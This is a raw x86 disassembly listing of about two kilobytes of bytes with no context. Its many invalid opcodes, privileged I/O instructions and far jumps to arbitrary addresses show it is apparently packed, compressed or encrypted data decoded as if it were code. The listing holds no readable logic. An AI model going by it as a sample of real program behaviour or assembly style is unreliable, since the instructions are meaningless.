  40f5dd:	and    DWORD PTR [edi+0x2f1d2b88],edi
  40f5e3:	(bad)  
  40f5e4:	mov    ebp,edx
  40f5e6:	test   BYTE PTR [esi-0x47],al
  40f5e9:	fwait
  40f5ea:	sub    al,0x1d
  40f5ec:	mov    ah,0xcd
  40f5ee:	ret    0xd44a
  40f5f1:	xchg   ecx,eax
  40f5f2:	or     DWORD PTR [edx-0x26],eax
  40f5f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5f6:	inc    edx
  40f5f7:	dec    DWORD PTR [edx-0x33f6d501]
  40f5fd:	lods   eax,DWORD PTR ds:[esi]
  40f5fe:	daa    
  40f5ff:	inc    eax
  40f600:	inc    esi
  40f601:	xor    edx,DWORD PTR [esi]
  40f603:	dec    eax
  40f604:	mov    ecx,0x5a3c0122
  40f609:	pushf  
  40f60a:	push   ds
  40f60b:	dec    ecx
  40f60c:	scas   al,BYTE PTR es:[edi]
  40f60d:	dec    esi
  40f60e:	push   edi
  40f60f:	push   esi
  40f610:	popf   
  40f611:	sub    ebp,DWORD PTR [esi+0x44]
  40f614:	xchg   DWORD PTR [ebp+0xde6260e],edx
  40f61a:	push   ebx
  40f61b:	mov    dh,BYTE PTR [esi+eiz*4-0x5b]
  40f61f:	js     0x40f642
  40f621:	ins    BYTE PTR es:[edi],dx
  40f622:	push   esp
  40f623:	cmp    al,0xf5
  40f625:	stos   BYTE PTR es:[edi],al
  40f626:	fadd   QWORD PTR [ebp+0x480166a1]
  40f62c:	mov    ds:0x3edf6b16,al
  40f631:	dec    ecx
  40f632:	jl     0x40f624
  40f634:	call   0x5736:0x55b8ef1c
  40f63b:	or     edx,DWORD PTR [esi]
  40f63d:	(bad)  
  40f63e:	int3   
  40f63f:	xor    edi,DWORD PTR [eax]
  40f641:	retf   
  40f642:	(bad)  
  40f643:	aam    0xa7
  40f645:	out    0x1f,eax
  40f647:	cdq    
  40f648:	jae    0x40f69a
  40f64a:	jge    0x40f614
  40f64c:	out    0x25,al
  40f64e:	add    dl,ah
  40f650:	int    0xbd
  40f652:	mov    ch,0xc2
  40f654:	mov    ds:0xb11feb1c,al
  40f659:	(bad)  
  40f65b:	addr16 sub al,0x54
  40f65e:	cmc    
  40f65f:	mov    BYTE PTR [ebx+0x4a375c15],0x61
  40f666:	(bad)  
  40f668:	mov    esp,0x2531b118
  40f66d:	adc    al,0xd5
  40f66f:	fst    DWORD PTR [esi-0x11]
  40f672:	pusha  
  40f673:	pop    esi
  40f674:	and    DWORD PTR [eax+ebx*2],ecx
  40f677:	push   ds
  40f678:	inc    ecx
  40f679:	gs push ss
  40f67b:	mov    BYTE PTR [edi-0x67b6ab10],bh
  40f681:	mov    ebx,0x247da977
  40f686:	push   0x6e
  40f688:	cwde   
  40f689:	sbb    ebp,DWORD PTR [esi]
  40f68b:	and    eax,0xc9469da0
  40f690:	mov    ah,0x12
  40f692:	jp     0x40f66e
  40f694:	stos   DWORD PTR es:[edi],eax
  40f695:	jg     0x40f6bf
  40f697:	push   esp
  40f698:	in     eax,0x10
  40f69a:	(bad)  [ebp+0x76]
  40f69d:	bound  ebx,QWORD PTR [ebx-0x51fb52be]
  40f6a3:	fidiv  DWORD PTR [edx+0x12]
  40f6a6:	fcom   st(0)
  40f6a8:	and    dx,WORD PTR [ebp-0x4076bd1b]
  40f6af:	cmp    eax,0xdd0c6aeb
  40f6b4:	cmp    BYTE PTR [edx-0x49],dh
  40f6b7:	dec    esp
  40f6b8:	arpl   WORD PTR [ebp+esi*2-0x4],ax
  40f6bc:	test   DWORD PTR [ebx+0x4bd9719d],0x1c44c93
  40f6c6:	rcl    DWORD PTR [eax],cl
  40f6c8:	pusha  
  40f6c9:	pop    eax
  40f6ca:	dec    esp
  40f6cb:	ins    DWORD PTR es:[edi],dx
  40f6cc:	cli    
  40f6cd:	xor    esi,esp
  40f6cf:	lods   al,BYTE PTR ds:[esi]
  40f6d0:	iret   
  40f6d1:	sbb    BYTE PTR [eax-0x3e],0x70
  40f6d5:	push   eax
  40f6d6:	mov    dh,0x3a
  40f6d8:	pop    ebp
  40f6d9:	inc    eax
  40f6da:	pop    esi
  40f6db:	fwait
  40f6dc:	pop    ss
  40f6dd:	ror    bl,0x2c
  40f6e0:	mov    esi,0xb5685097
  40f6e5:	adc    ebp,edi
  40f6e7:	lea    esi,[ecx]
  40f6e9:	add    DWORD PTR [ebx],eax
  40f6eb:	aas    
  40f6ec:	les    ecx,FWORD PTR [ebp-0x15]
  40f6ef:	mov    edx,0xf98f0035
  40f6f4:	loope  0x40f767
  40f6f6:	adc    DWORD PTR [edx],0x6e0cc8e2
  40f6fc:	xchg   ebx,eax
  40f6fd:	push   ds
  40f6fe:	mov    cl,0x40
  40f700:	mov    esp,0xe012b92a
  40f705:	aam    0xa3
  40f707:	fidivr DWORD PTR [ebx]
  40f709:	or     dh,BYTE PTR [esi+ebp*2]
  40f70c:	push   eax
  40f70d:	pop    ebx
  40f70e:	es loopne 0x40f775
  40f711:	rcl    BYTE PTR [esi+0x4e],1
  40f714:	or     DWORD PTR [ebx-0x7],edx
  40f717:	mov    cl,0x20
  40f719:	stos   BYTE PTR es:[edi],al
  40f71a:	adc    ecx,edi
  40f71c:	rcr    esp,0x5c
  40f71f:	test   DWORD PTR [esi],esi
  40f721:	mov    al,ds:0x685364cc
  40f726:	cmp    dl,dl
  40f728:	pusha  
  40f729:	es mov bl,0xed
  40f72c:	in     eax,0xec
  40f72e:	or     ah,BYTE PTR [edi+0x6a]
  40f731:	mov    ch,0xc6
  40f733:	les    esi,FWORD PTR [ecx]
  40f735:	scas   eax,DWORD PTR es:[edi]
  40f736:	add    eax,0x2f964b3f
  40f73b:	xchg   eax,ebp
  40f73d:	mov    ch,0xa3
  40f73f:	sub    ah,ah
  40f741:	data16 int 0x68
  40f744:	cs cli 
  40f746:	xor    edx,DWORD PTR [ecx]
  40f748:	out    0x61,eax
  40f74a:	hlt    
  40f74b:	xlat   BYTE PTR ds:[ebx]
  40f74c:	push   ebx
  40f74d:	loop   0x40f742
  40f74f:	mov    bl,0xde
  40f751:	fcomp  DWORD PTR [edx+0x7a]
  40f754:	imul   edi,DWORD PTR [eax-0x6269d0e],0xffffff8d
  40f75b:	int3   
  40f75c:	mov    ebx,0x1b0699e0
  40f761:	mov    ch,0xe
  40f763:	popa   
  40f764:	jmp    0xaa3a0ec6
  40f769:	mov    ds:0x7978dd4a,al
  40f76e:	je     0x40f7d6
  40f770:	fs xchg edi,eax
  40f772:	inc    edi
  40f773:	enter  0xa37e,0x99
  40f777:	das    
  40f778:	out    0xd0,eax
  40f77a:	mov    dh,0x16
  40f77c:	mov    dh,0x67
  40f77e:	mov    BYTE PTR [ebp-0x21],ah
  40f781:	loopne 0x40f72e
  40f783:	test   BYTE PTR [ecx-0x52],0x80
  40f787:	lods   eax,DWORD PTR ds:[esi]
  40f788:	pusha  
  40f789:	int3   
  40f78a:	jle    0x40f74b
  40f78c:	popf   
  40f78d:	test   eax,0xe4e9a85a
  40f792:	pop    ebp
  40f793:	push   0x6502d606
  40f798:	dec    ecx
  40f799:	test   edi,0x1b627926
  40f79f:	in     eax,0x3e
  40f7a1:	push   cs
  40f7a2:	shr    esp,cl
  40f7a4:	cmp    DWORD PTR ds:0x6e9b81da,esi
  40f7aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7ab:	loopne 0x40f749
  40f7ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7ae:	popf   
  40f7af:	jne    0x40f741
  40f7b1:	dec    edx
  40f7b2:	sub    BYTE PTR [esi-0x2],dh
  40f7b5:	imul   eax,DWORD PTR [esi+0x5e],0xc2473777
  40f7bc:	push   ecx
  40f7bd:	in     al,0xf4
  40f7bf:	or     al,0x63
  40f7c1:	in     al,0xf3
  40f7c3:	stc    
  40f7c4:	sub    cl,BYTE PTR [ebp+0x57]
  40f7c7:	add    eax,0xcc6c3ab9
  40f7cc:	jmp    0x5b45:0x169a60e8
  40f7d3:	stos   BYTE PTR es:[edi],al
  40f7d4:	xchg   dh,cl
  40f7d6:	sub    DWORD PTR [edi+0x37638e8f],edx
  40f7dc:	scas   al,BYTE PTR es:[edi]
  40f7dd:	push   ss
  40f7de:	mov    ds:0x80c9557a,al
  40f7e3:	and    BYTE PTR [ecx+eiz*4-0x63],bh
  40f7e7:	inc    ebx
  40f7e8:	mov    ah,0xb3
  40f7ea:	push   0x2ea20ac6
  40f7ef:	inc    eax
  40f7f0:	mov    ebx,DWORD PTR ds:0x650c1cae
  40f7f6:	in     eax,dx
  40f7f7:	push   ss
  40f7f8:	stos   BYTE PTR es:[edi],al
  40f7f9:	scas   eax,DWORD PTR es:[edi]
  40f7fa:	dec    esi
  40f7fb:	ret    
  40f7fc:	inc    esp
  40f7fd:	lock stos DWORD PTR es:[edi],eax
  40f7ff:	adc    BYTE PTR [esi],0xa4
  40f802:	mov    bh,0x2b
  40f804:	ins    DWORD PTR es:[edi],dx
  40f805:	add    ebp,DWORD PTR [eax+0x1eebcb27]
  40f80b:	sbb    eax,0xb5d1f34a
  40f810:	rcl    DWORD PTR [edx+0x5651e012],cl
  40f816:	xlat   BYTE PTR ds:[ebx]
  40f817:	in     al,dx
  40f818:	dec    ebx
  40f819:	mov    eax,0x9b708a72
  40f81e:	hlt    
  40f81f:	cwde   
  40f820:	push   edi
  40f821:	call   0x7b13:0x6b2d4397
  40f828:	mov    WORD PTR [edi-0x19],gs
  40f82b:	fisttp WORD PTR [ebp+0x5ab15323]
  40f831:	in     eax,0xf3
  40f833:	dec    esi
  40f834:	das    
  40f835:	je     0x40f86a
  40f837:	sbb    esi,ebp
  40f839:	push   ebx
  40f83a:	and    al,0x92
  40f83c:	in     al,0x2f
  40f83e:	fstp   DWORD PTR [edx+0x62]
  40f841:	dec    ebp
  40f842:	int3   
  40f843:	add    eax,0xa6b8e1a9
  40f848:	inc    ebx
  40f849:	fild   WORD PTR [eax-0x60]
  40f84c:	popa   
  40f84d:	xor    eax,0x74e81260
  40f852:	or     dl,BYTE PTR [ecx+0x20]
  40f855:	mov    ds:0xdbf8b0f5,al
  40f85a:	adc    eax,0x67c04ffa
  40f85f:	sub    dl,dh
  40f861:	cmp    BYTE PTR [ebp-0x71],cl
  40f864:	outs   dx,BYTE PTR ds:[esi]
  40f865:	mov    cl,0xa
  40f867:	out    0x9b,al
  40f869:	ja     0x40f826
  40f86b:	push   ebp
  40f86c:	and    DWORD PTR [edi],edx
  40f86e:	outs   dx,BYTE PTR ds:[esi]
  40f86f:	pop    esi
  40f870:	xor    ecx,ecx
  40f872:	jle    0x40f82f
  40f874:	int    0x4a
  40f876:	mov    al,ds:0xbbcb2f25
  40f87b:	jmp    0x40f896
  40f87d:	je     0x40f81b
  40f87f:	outs   dx,BYTE PTR ds:[esi]
  40f880:	daa    
  40f881:	mov    ebp,es
  40f883:	mov    DWORD PTR [ebp-0x71],esi
  40f886:	pushf  
  40f887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f888:	imul   eax,DWORD PTR [eax-0x69a83edf],0xd1c8cc6b
  40f892:	mov    edi,0x82a19b38
  40f897:	jge    0x40f822
  40f899:	out    0x2,al
  40f89b:	inc    edx
  40f89c:	std    
  40f89d:	mov    bl,0x59
  40f89f:	repnz or bl,al
  40f8a2:	ins    DWORD PTR es:[edi],dx
  40f8a3:	fisubr WORD PTR [esi]
  40f8a5:	xor    eax,DWORD PTR [esi]
  40f8a7:	jmp    0x40f8c7
  40f8a9:	repz push 0x0
  40f8ac:	xchg   DWORD PTR es:[edx],eax
  40f8af:	sub    BYTE PTR [ebx],dh
  40f8b1:	ret    0x1110
  40f8b4:	fcomp  QWORD PTR [edi+0x70]
  40f8b7:	loop   0x40f856
  40f8b9:	ins    DWORD PTR es:[edi],dx
  40f8ba:	outs   dx,DWORD PTR ds:[esi]
  40f8bb:	xchg   ebx,eax
  40f8bc:	cmp    ch,BYTE PTR [edx+0x2b2bcc0d]
  40f8c2:	lods   eax,DWORD PTR ds:[esi]
  40f8c3:	sub    BYTE PTR [edx+0x5dc9b7d2],0xf4
  40f8ca:	sti    
  40f8cb:	aaa    
  40f8cc:	sbb    BYTE PTR [esi-0x59],0x22
  40f8d0:	popf   
  40f8d1:	dec    ecx
  40f8d2:	scas   al,BYTE PTR es:[edi]
  40f8d3:	sub    eax,0xe67403b9
  40f8d8:	push   ds
  40f8d9:	sub    eax,0x5c04b9ab
  40f8de:	sti    
  40f8df:	popa   
  40f8e0:	out    dx,eax
  40f8e1:	outs   dx,DWORD PTR ds:[esi]
  40f8e2:	jne    0x40f86b
  40f8e4:	loopne 0x40f897
  40f8e6:	aaa    
  40f8e7:	cmp    DWORD PTR [esi+0x3bb424d0],ebp
  40f8ed:	aam    0x81
  40f8ef:	push   eax
  40f8f0:	or     edi,DWORD PTR ds:0x9852316e
  40f8f6:	mov    BYTE PTR [eax],dh
  40f8f8:	inc    ecx
  40f8f9:	ins    DWORD PTR es:[edi],dx
  40f8fa:	popa   
  40f8fb:	push   cs
  40f8fc:	jno    0x40f897
  40f8fe:	and    esi,ebp
  40f900:	jmp    0x40f979
  40f902:	dec    esi
  40f903:	(bad)  
  40f904:	retf   
  40f905:	add    DWORD PTR [edi],esi
  40f907:	imul   edx,esi,0x8c289e5e
  40f90d:	mov    esi,0x157c7532
  40f912:	into   
  40f913:	in     al,0xa4
  40f915:	lock jns 0x40f953
  40f918:	jns    0x40f8af
  40f91a:	stos   DWORD PTR es:[edi],eax
  40f91b:	(bad)  
  40f91c:	imul   edi,DWORD PTR [ebx],0xffffffd6
  40f91f:	daa    
  40f920:	sbb    eax,DWORD PTR [eax]
  40f922:	dec    ebx
  40f923:	retf   0xb2d0
  40f926:	jnp    0x40f99f
  40f928:	cmp    al,0x31
  40f92a:	retf   0xf703
  40f92d:	je     0x40f8b4
  40f92f:	ret    0x8350
  40f932:	test   BYTE PTR ds:0xdf91cda1,cl
  40f938:	ror    DWORD PTR [ecx-0x34769e1f],1
  40f93e:	cmp    cl,BYTE PTR [ebx+0x7fe1c23a]
  40f944:	sbb    bl,cl
  40f946:	jle    0x40f8dd
  40f948:	and    eax,0xd7e4d3ff
  40f94d:	(bad)  
  40f94e:	dec    esp
  40f94f:	adc    al,0x3a
  40f951:	hlt    
  40f952:	push   edx
  40f953:	ins    BYTE PTR es:[edi],dx
  40f954:	push   ebp
  40f955:	stc    
  40f956:	enter  0xc1c7,0xc
  40f95a:	mov    ebx,0x3d090ce6
  40f95f:	movnti DWORD PTR [eax-0x16ba91ce],ebx
  40f966:	aas    
  40f967:	or     eax,0xe538af61
  40f96c:	in     eax,dx
  40f96d:	mov    ecx,0x22fdcc8d
  40f972:	jge    0x40f99e
  40f974:	or     ebp,DWORD PTR [edi]
  40f976:	pop    ecx
  40f977:	repz rcl BYTE PTR [edx],1
  40f97a:	jne    0x40f918
  40f97c:	cwde   
  40f97d:	aam    0x89
  40f97f:	je     0x40f9ce
  40f981:	cwde   
  40f982:	jmp    0xa546:0xd9a8421f
  40f989:	imul   ebx,DWORD PTR [eax-0x696b5651],0x3553e193
  40f993:	inc    edx
  40f994:	sub    eax,0x1d6927af
  40f999:	int    0x3c
  40f99b:	mov    cl,0xae
  40f99d:	(bad)  
  40f99e:	aam    0x7f
  40f9a0:	xchg   esi,eax
  40f9a1:	mov    edi,0x1ad0911d
  40f9a6:	int3   
  40f9a7:	out    dx,al
  40f9a8:	fild   QWORD PTR [eax]
  40f9aa:	in     al,dx
  40f9ab:	sbb    eax,0x7e6fef8c
  40f9b0:	mov    al,0x69
  40f9b2:	fisub  WORD PTR [eax]
  40f9b4:	(bad)  
  40f9b6:	jge    0x40f9cb
  40f9b8:	pop    esi
  40f9ba:	fdivr  DWORD PTR [ebp*8+0x661d5d11]
  40f9c1:	jp     0x40f99d
  40f9c3:	out    dx,al
  40f9c4:	push   eax
  40f9c5:	fisub  WORD PTR [ebp-0x4d]
  40f9c8:	inc    esi
  40f9c9:	cli    
  40f9ca:	pop    ebp
  40f9cb:	je     0x40f964
  40f9cd:	jnp    0x40f9b9
  40f9cf:	xlat   BYTE PTR ds:[ebx]
  40f9d0:	daa    
  40f9d1:	add    ebx,DWORD PTR [edi+ecx*2]
  40f9d4:	or     ch,ch
  40f9d6:	imul   esi,ecx,0xc65797ab
  40f9dc:	(bad)  
  40f9dd:	sub    DWORD PTR [eax],eax
  40f9df:	scas   eax,DWORD PTR es:[edi]
  40f9e0:	push   edx
  40f9e1:	add    ebp,DWORD PTR [ebp-0x4b06df27]
  40f9e7:	mov    ebp,0x49c5fa98
  40f9ec:	aam    0xdf
  40f9ee:	pop    es
  40f9ef:	call   FWORD PTR [ebp-0x59535bcc]
  40f9f5:	call   0x796f08bf
  40f9fa:	fs test al,0xe9
  40f9fd:	rcr    ecx,1
  40f9ff:	mov    cl,0x70
  40fa01:	xchg   edi,eax
  40fa02:	lods   eax,DWORD PTR ds:[esi]
  40fa03:	cmp    eax,0x47fb2a15
  40fa08:	in     eax,dx
  40fa09:	je     0x40fa3b
  40fa0b:	(bad)  
  40fa0c:	ficomp WORD PTR [ecx-0x5b]
  40fa0f:	sub    cl,cl
  40fa11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa12:	mul    DWORD PTR [edx]
  40fa14:	dec    ecx
  40fa15:	(bad)  
  40fa17:	cmp    dh,ah
  40fa19:	inc    esp
  40fa1a:	retf   
  40fa1b:	popf   
  40fa1c:	and    DWORD PTR [ebx],ecx
  40fa1e:	pop    eax
  40fa1f:	mov    esp,0x5f7f9f4d
  40fa24:	xchg   esp,eax
  40fa25:	rol    ecx,0x1f
  40fa28:	rol    cl,0x9d
  40fa2b:	or     al,0x5a
  40fa2d:	pop    ds
  40fa2e:	sub    ah,BYTE PTR [esi-0x55c6b39e]
  40fa34:	mov    edi,0x78ff3965
  40fa39:	mov    al,0x8f
  40fa3b:	lock in al,dx
  40fa3d:	sub    eax,0x71683701
  40fa42:	ss dec edi
  40fa44:	cmp    al,0x53
  40fa46:	cmp    al,0xcc
  40fa48:	pop    esi
  40fa49:	xchg   ecx,eax
  40fa4a:	xor    dl,BYTE PTR [ecx]
  40fa4c:	imul   esp,DWORD PTR [esi+0xc7bf6a],0x63
  40fa53:	mov    eax,ds:0x3c43d745
  40fa58:	jmp    0x40fa38
  40fa5a:	sub    ebx,DWORD PTR [ebp-0x69185dc6]
  40fa60:	mov    edx,0x67b796bb
  40fa65:	shl    DWORD PTR [ebx],cl
  40fa67:	and    dh,BYTE PTR [ebx+0x68]
  40fa6a:	mov    DWORD PTR [eax],esi
  40fa6c:	gs add dl,0x40
  40fa70:	(bad)  
  40fa71:	jns    0x40fa2a
  40fa73:	xchg   ebp,eax
  40fa74:	mov    eax,0x2bc0548d
  40fa79:	jns    0x40fa68
  40fa7b:	fisttp DWORD PTR [eax+0x47]
  40fa7e:	imul   edx,DWORD PTR [edi-0x2b],0x13
  40fa82:	fidivr DWORD PTR [ebp+0x58]
  40fa85:	xor    ah,BYTE PTR [eax+0x33]
  40fa88:	arpl   WORD PTR [ebx-0x19acef83],dx
  40fa8e:	add    al,0x14
  40fa90:	aaa    
  40fa91:	fdivr  QWORD PTR [ebp+0x7c]
  40fa94:	adc    eax,0xea0fb487
  40fa99:	retf   
  40fa9a:	jp     0x40fa90
  40fa9c:	test   BYTE PTR [edx+eiz*1],ah
  40fa9f:	mov    bh,0x80
  40faa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faa2:	mov    ds:0xa5458071,al
  40faa7:	gs xor ch,BYTE PTR cs:[eax]
  40faab:	xchg   ebx,eax
  40faac:	shl    BYTE PTR [ebx+eax*1+0x633df880],1
  40fab3:	jmp    0x2bcdfd30
  40fab8:	sbb    esi,DWORD PTR [ebx+ebx*8+0x6e]
  40fabc:	adc    esi,DWORD PTR [ebx+0x26]
  40fabf:	mov    eax,0x5e9c8850
  40fac4:	xchg   esp,eax
  40fac5:	pop    esp
  40fac6:	mov    bh,0xc7
  40fac8:	xchg   esp,eax
  40fac9:	pop    ebx
  40faca:	add    eax,0xd8280f7a
  40facf:	push   ebx
  40fad0:	ja     0x40fb3e
  40fad2:	pushf  
  40fad3:	mov    eax,0x99fe6617
  40fad8:	arpl   di,ax
  40fada:	pop    ebx
  40fadb:	mov    esi,0xaf1dfa9e
  40fae0:	sbb    DWORD PTR [edx-0x7cd12132],ebx
  40fae6:	push   ebp
  40fae7:	jle    0x40face
  40fae9:	and    dl,BYTE PTR [edi+0x744bebf7]
  40faef:	push   0xffffffad
  40faf1:	retf   
  40faf2:	mov    al,bl
  40faf4:	jg     0x40fa9f
  40faf6:	mov    ebx,0x85454e29
  40fafb:	push   esp
  40fafc:	in     al,0x7e
  40fafe:	sar    DWORD PTR [ecx+0x1d],cl
  40fb01:	push   ecx
  40fb02:	lock jno 0x40fac1
  40fb05:	dec    esp
  40fb06:	idiv   DWORD PTR [eax-0x63]
  40fb09:	clc    
  40fb0a:	jle    0x40faa8
  40fb0c:	aas    
  40fb0d:	sbb    eax,0x6ac85c71
  40fb12:	push   edx
  40fb13:	push   es
  40fb14:	or     ah,BYTE PTR [ebx+edi*1]
  40fb17:	jecxz  0x40fa9a
  40fb19:	mov    gs,WORD PTR [edi-0x38689a26]
  40fb1f:	push   edx
  40fb20:	mov    bl,0xc1
  40fb22:	stc    
  40fb23:	je     0x40fb9e
  40fb25:	or     BYTE PTR [edx],al
  40fb27:	push   ebx
  40fb28:	jb     0x40fae7
  40fb2a:	(bad)  
  40fb2b:	mov    edx,0x9960091a
  40fb30:	and    BYTE PTR [esi],dl
  40fb32:	xchg   esi,eax
  40fb33:	push   edx
  40fb34:	xchg   ebp,eax
  40fb35:	mov    dh,0x9e
  40fb37:	adc    DWORD PTR [edi+edx*8+0x14],ecx
  40fb3b:	jne    0x40fb7a
  40fb3d:	and    BYTE PTR [esi-0x70c94edf],bh
  40fb43:	push   cs
  40fb44:	push   ds
  40fb45:	scas   al,BYTE PTR es:[edi]
  40fb46:	and    eax,0x2fb92e6b
  40fb4b:	in     eax,dx
  40fb4c:	test   BYTE PTR ds:0xa4fb1268,ah
  40fb52:	enter  0x17e0,0xdd
  40fb56:	inc    esp
  40fb57:	mov    ah,0x28
  40fb59:	sub    BYTE PTR [edx-0x12],0xfd
  40fb5d:	fwait
  40fb5e:	aas    
  40fb5f:	push   ss
  40fb60:	mov    ah,0x35
  40fb62:	pop    ds
  40fb63:	pop    ss
  40fb64:	jnp    0x40fb16
  40fb66:	dec    DWORD PTR [ecx-0x67]
  40fb69:	and    eax,0xa27b5eb6
  40fb6e:	mov    esi,DWORD PTR [eax-0x1a]
  40fb71:	push   edi
  40fb72:	jge    0x40fbf3
  40fb74:	xchg   BYTE PTR [esi-0x6a],bh
  40fb77:	dec    edi
  40fb78:	push   ebx
  40fb79:	mov    ds:0x8bf83a08,eax
  40fb7e:	repnz sar eax,0x36
  40fb82:	test   BYTE PTR [edx-0x5495608d],bh
  40fb88:	pop    esp
  40fb89:	dec    ecx
  40fb8a:	into   
  40fb8b:	stos   DWORD PTR es:[edi],eax
  40fb8c:	outs   dx,BYTE PTR ds:[esi]
  40fb8d:	push   cs
  40fb8e:	pop    edx
  40fb8f:	(bad)  
  40fb90:	xlat   BYTE PTR ds:[ebx]
  40fb91:	xchg   edx,eax
  40fb92:	dec    ebp
  40fb93:	xchg   esp,eax
  40fb94:	popf   
  40fb95:	jle    0x40fbc5
  40fb97:	popa   
  40fb98:	and    al,BYTE PTR [eax+0x4294661c]
  40fb9e:	fist   WORD PTR [eax+0x2c9477d7]
  40fba4:	add    BYTE PTR [ebx],dh
  40fba6:	pop    edi
  40fba7:	or     ah,BYTE PTR [ebx+eiz*4-0x78b05a07]
  40fbae:	popa   
  40fbaf:	std    
  40fbb0:	add    dl,bh
  40fbb2:	enter  0x9f68,0x1c
  40fbb6:	and    ebp,eax
  40fbb8:	outs   dx,BYTE PTR ds:[esi]
  40fbb9:	pop    esi
  40fbba:	jmp    0x4f8a6f78
  40fbbf:	jp     0x40fbb2
  40fbc1:	adc    edi,DWORD PTR [edi-0x62]
  40fbc4:	popf   
  40fbc5:	test   BYTE PTR [ebx+eiz*4+0x57f95f32],0x11
  40fbcd:	pop    ecx
  40fbce:	sub    DWORD PTR [ecx+edi*8+0x368691a4],eax
  40fbd5:	jmp    0xcbfe:0x3eaa4633
  40fbdc:	data16 loop 0x40fc45
  40fbdf:	rcl    BYTE PTR [esi],cl
  40fbe1:	popf   
  40fbe2:	mov    edx,0x709db9d2
  40fbe7:	push   es
  40fbe8:	es pop ecx
  40fbea:	lds    eax,FWORD PTR [ebp+0x52]
  40fbed:	call   0xd627b814
  40fbf2:	and    eax,DWORD PTR [edi]
  40fbf4:	and    ch,BYTE PTR [edx+0x18d967ae]
  40fbfa:	jo     0x40fc0c
  40fbfc:	or     cl,bh
  40fbfe:	aaa    
  40fbff:	daa    
  40fc00:	xor    BYTE PTR [ecx+0x3c],dl
  40fc03:	pushf  
  40fc04:	bound  esi,QWORD PTR [ebp+0x2e113c03]
  40fc0a:	pop    es
  40fc0b:	repz mov ebp,0xeae9ac87
  40fc11:	data16 mov ch,0xe2
  40fc14:	dec    ecx
  40fc15:	dec    edx
  40fc16:	clc    
  40fc17:	aad    0x53
  40fc19:	mov    ecx,0x452f3853
  40fc1e:	sub    BYTE PTR [ecx],0xdf
  40fc21:	outs   dx,BYTE PTR ds:[esi]
  40fc22:	jg     0x40fc64
  40fc24:	pop    esi
  40fc25:	adc    al,0xf3
  40fc27:	sar    cl,1
  40fc29:	and    eax,0x9a4015c5
  40fc2e:	push   0xf3511a52
  40fc33:	mov    al,ds:0x57c792e7
  40fc38:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc3a:	pop    ecx
  40fc3b:	xor    bl,BYTE PTR [ecx-0x6a233774]
  40fc41:	xor    bl,BYTE PTR [edi]
  40fc43:	pop    ds
  40fc44:	stos   DWORD PTR es:[edi],eax
  40fc45:	mov    al,0xd4
  40fc47:	mov    DWORD PTR [ebx],ecx
  40fc49:	inc    esi
  40fc4a:	lock aaa 
  40fc4c:	stos   DWORD PTR es:[edi],eax
  40fc4d:	repz pop ss
  40fc4f:	mov    bh,0xa7
  40fc51:	or     ch,dl
  40fc53:	adc    BYTE PTR [ebx+0x31],0x26
  40fc57:	(bad)  
  40fc58:	aas    
  40fc59:	out    0x9b,al
  40fc5b:	(bad)  
  40fc5c:	jbe    0x40fc81
  40fc5e:	fs inc edx
  40fc60:	addr16 xor al,0x81
  40fc63:	movaps xmm0,XMMWORD PTR [ecx]
  40fc66:	ss mov edx,0xf3ae69c2
  40fc6c:	jne    0x40fcbe
  40fc6e:	adc    eax,0xd5d616c4
  40fc73:	(bad)  
  40fc74:	pop    esi
  40fc75:	stos   BYTE PTR es:[edi],al
  40fc76:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc78:	pop    edx
  40fc79:	jnp    0x40fc48
  40fc7b:	daa    
  40fc7c:	adc    BYTE PTR [edi-0x45],bl
  40fc7f:	pop    es
  40fc80:	shl    BYTE PTR [edi+0x1158ac23],0x8f
  40fc87:	sbb    ah,BYTE PTR ss:[ebx+0x0]
  40fc8b:	xchg   ebx,eax
  40fc8c:	inc    eax
  40fc8d:	call   0x70c74816
  40fc92:	push   ds
  40fc93:	mov    ebx,edi
  40fc95:	ins    BYTE PTR es:[edi],dx
  40fc96:	out    dx,al
  40fc97:	cmp    ebp,eax
  40fc99:	fist   WORD PTR [ecx+0x36]
  40fc9c:	jb     0x40fc4c
  40fc9e:	inc    ecx
  40fc9f:	(bad)  
  40fca1:	popf   
  40fca2:	jmp    0xf614:0x678dcb53
  40fca9:	lock icebp 
  40fcab:	jmp    0x604da0a1
  40fcb0:	mov    ebp,0x4d449fbc
  40fcb5:	jbe    0x40fd01
  40fcb7:	test   eax,eax
  40fcb9:	sub    DWORD PTR [esi-0x62],eax
  40fcbc:	fidivr WORD PTR [edi]
  40fcbe:	bound  ebp,QWORD PTR [ecx+ecx*8]
  40fcc1:	clc    
  40fcc2:	bound  edi,QWORD PTR [edx]
  40fcc4:	cmp    al,0x2f
  40fcc6:	jno    0x40fd3a
  40fcc8:	add    BYTE PTR [edi-0x2ddc6862],cl
  40fcce:	lds    edi,FWORD PTR [esi+0x4f]
  40fcd1:	or     al,0xc1
  40fcd3:	cli    
  40fcd4:	push   ss
  40fcd5:	inc    ecx
  40fcd6:	xlat   BYTE PTR ds:[ebx]
  40fcd7:	mov    dl,0xed
  40fcd9:	lea    esi,[edi+0x3]
  40fcdc:	repnz ss popf 
  40fcdf:	sti    
  40fce0:	pushf  
  40fce1:	aad    0x4
  40fce3:	call   0x1549:0x28fe7869
  40fcea:	inc    ebx
  40fceb:	push   es
  40fcec:	mov    bh,0x3d
  40fcee:	jp     0x40fcb4
  40fcf0:	repnz adc DWORD PTR [edi+edi*4+0x1e],ebp
  40fcf5:	call   0xed8a90ed
  40fcfa:	cmp    eax,0xe4b0feda
  40fcff:	jnp    0x40fc9a
  40fd01:	leave  
  40fd02:	jle    0x40fd46
  40fd04:	call   0x95e0:0xd0e2c564
  40fd0b:	shl    DWORD PTR ds:0xea3ac69c,1
  40fd11:	iret   
  40fd12:	jmp    0x40fc9d
  40fd14:	mov    ecx,0x689af9af
  40fd19:	pop    es
  40fd1a:	inc    ebx
  40fd1b:	dec    ebp
  40fd1c:	je     0x40fd70
  40fd1e:	sti    
  40fd1f:	repnz push ecx
  40fd21:	xchg   esp,eax
  40fd22:	mov    edx,0xf2aea142
  40fd27:	pusha  
  40fd28:	jge    0x40fcca
  40fd2a:	xlat   BYTE PTR ds:[ebx]
